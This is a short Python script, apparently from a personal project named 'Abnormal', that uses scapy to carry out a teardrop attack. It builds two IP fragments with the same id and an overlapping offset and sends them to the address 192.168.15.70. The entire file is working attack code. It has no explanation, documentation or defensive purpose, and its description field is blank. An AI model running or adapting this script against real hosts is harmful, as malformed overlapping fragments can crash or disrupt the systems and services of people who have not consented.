# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> teardrop.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/26 10:35

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

from scapy.all import *


def crafting_packets( flags, frag = 0, proto = 17, dst = "192.168.15.70"):
    network_layer = IP(
        id = 1111,
        flags = flags,
        frag = frag,
        proto = proto,
        dst = dst
    )
    data = "111111111111111111111111"
    pkt = network_layer / data
    return pkt


def send_packers(pkt):
    send(pkt)


if __name__ == '__main__':
    pkt = crafting_packets(1, 0, 17)
    send_packers(pkt)
    pkt = crafting_packets(1, 20, 17)
    send_packers(pkt)